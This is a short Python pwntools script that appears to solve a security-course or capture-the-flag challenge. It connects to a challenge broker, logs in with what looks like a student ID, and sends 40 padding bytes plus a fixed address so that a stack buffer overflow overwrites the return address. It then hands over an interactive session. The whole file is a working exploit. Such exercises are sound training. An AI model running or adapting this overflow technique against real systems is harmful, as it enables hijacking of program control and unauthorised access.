#!/usr/bin/env python

import sys
from pwn import *

REMOTE = True

bridge = ELF(sys.argv[1])

if REMOTE:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1339)
    p.recvuntil(":")
    p.sendline("joe215")
else:
    p = process(sys.argv[1])

print(p.recvuntil(":"))
mystr = "a" * 40 + p64(0x4006bb)
print(mystr)
p.sendline(mystr)
p.interactive()
